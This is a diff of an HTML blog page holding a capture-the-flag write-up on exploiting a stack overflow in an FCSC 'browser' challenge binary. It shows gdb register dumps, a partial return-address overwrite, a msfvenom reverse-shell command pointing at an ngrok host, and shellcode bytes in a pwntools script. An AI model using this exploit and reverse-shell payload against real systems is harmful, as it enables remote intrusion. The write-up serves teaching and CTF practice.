@@ -145,7 +145,7 @@ gef&gt;  x/s $rdi-15
 </code></pre><p>There isn&rsquo;t any protection ! That&rsquo;s good news for us.</p>
 <p>Let&rsquo;s quickly check out our idea.
 For this, I wrote a simple python script</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#00f">from</span> pwn <span style="color:#00f">import</span> *
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#00f">from</span> pwn <span style="color:#00f">import</span> *
 
 buf = <span style="color:#a31515">b</span><span style="color:#a31515">&#39;a&#39;</span>*200
 
@@ -180,10 +180,10 @@ The next step is to find how many bytes are needed to overwrite this return addr
 <p>Let&rsquo;s move on to exploitation. The first idea that comes to mind, because <code>NX</code> is not enabled, is to write a shellcode in our buffer, then jump to it. However, I assume <code>ASLR</code> is enabled on the remote machine, so I don&rsquo;t really have a way to predict at what address the shellcode will end up. Next, we think of the heap : because this is a web browser, I expect the string to be allocated on the heap (we can see on the first <code>gdb</code> breakpoint above that the <code>rsi</code> register contains a heap address, at which is stored our string).
 Again, because <code>NX</code> is not enabled, we could jump to our shellcode in the heap, however, because this is a web browser, many allocations occur on the heap, thus it is difficult to predict in what state the heap will be when the bot ends up on our page.</p>
 <p>So the next logical idea is to build a ropchain to get a reverse shell. However, after a few tries, I quickly realized something : if we modify the python script to have</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">buf = <span style="color:#a31515">b</span><span style="color:#a31515">&#39;a&#39;</span>*137 + p64(0)
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">buf = <span style="color:#a31515">b</span><span style="color:#a31515">&#39;a&#39;</span>*137 + p64(0)
 </code></pre></div><p>and break at the return of the <code>addBrowser</code> function, our return address is not <code>0x0000000000000000</code>, it is completely scrambled. The reason for this is because in the <code>addBrowser</code> function, it calculates the length of the string before <code>memcpy</code>&lsquo;ing it to the stack buffer, so it stops after a null byte. So we can&rsquo;t write the full address of our gadgets in the ropchain.</p>
 <p>Luckily for us, if we change our <code>buf</code> to be</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">buf = <span style="color:#a31515">b</span><span style="color:#a31515">&#39;a&#39;</span>*137 + <span style="color:#a31515">b</span><span style="color:#a31515">&#39;A&#39;</span>*4
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">buf = <span style="color:#a31515">b</span><span style="color:#a31515">&#39;a&#39;</span>*137 + <span style="color:#a31515">b</span><span style="color:#a31515">&#39;A&#39;</span>*4
 </code></pre></div><p>at the end of the <code>addBrowser</code> function, our return address is <code>0x0000000041414141</code>. Therefore, we can partially overwrite this return address to point to any gadget we want. However, that means we can only use one gadget, because we can&rsquo;t write anything afterwards.</p>
 <p>How do we exploit this ? Let&rsquo;s check out our registers at the end of <code>addBrowser</code> when overwriting the return address.</p>
 <pre><code>gef&gt;  registers 
@@ -209,7 +209,7 @@ $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
 </code></pre><p>The first thing that jumps out is that if we found a <code>jmp rsp</code> gadget, we could jump to our shellcode, however as we just saw we cannot write anything after the address of our gadget, so we cannot use this idea.
 Next, we notice that <code>rsi</code>, <code>rdi</code> and <code>r8</code> all have addresses where our string is allocated, either on the stack or in the heap, which are executable.
 If we found a gadget that lets us jump to any of these, we could execute a shellcode, however, there is a slight problem : before our shellcode, there is <code>FCSC Browser - </code>, and if we check out what it translates to if executed, there are invalid instruction.</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">&gt;&gt;&gt;<span style="color:#00f">print</span>(disasm(<span style="color:#a31515">b</span><span style="color:#a31515">&#39;FCSC Browser - &#39;</span>, arch=<span style="color:#a31515">&#34;amd64&#34;</span>))
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">&gt;&gt;&gt;print(disasm(<span style="color:#a31515">b</span><span style="color:#a31515">&#39;FCSC Browser - &#39;</span>, arch=<span style="color:#a31515">&#34;amd64&#34;</span>))
 0:   46                      rex.RX
 1:   43 53                   rex.XB push r11
 3:   43 20 42 72             rex.XB <span style="color:#00f">and</span> BYTE PTR [r10+0x72], al
@@ -233,7 +233,7 @@ e:   20                      .byte 0x20
 <p>We can generate such payload using <code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=2.tcp.ngrok.io LPORT=15636 -b '\x00' -f py</code></p>
 <p>The output is 119 bytes long, that can fit in our <code>137 - (0x1e - 15) = 122</code> bytes space.</p>
 <p>We modify our python script :</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">buf =  <span style="color:#a31515">b</span><span style="color:#a31515">&#34;&#34;</span>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">buf =  <span style="color:#a31515">b</span><span style="color:#a31515">&#34;&#34;</span>
 buf += <span style="color:#a31515">b</span><span style="color:#a31515">&#34;</span><span style="color:#a31515">\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05</span><span style="color:#a31515">&#34;</span>
 buf += <span style="color:#a31515">b</span><span style="color:#a31515">&#34;</span><span style="color:#a31515">\xef\xff\xff\xff\x48\xbb\x81\x80\xcc\xaa\x59\x82\x18</span><span style="color:#a31515">&#34;</span>
 buf += <span style="color:#a31515">b</span><span style="color:#a31515">&#34;</span><span style="color:#a31515">\x8e\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4</span><span style="color:#a31515">&#34;</span>
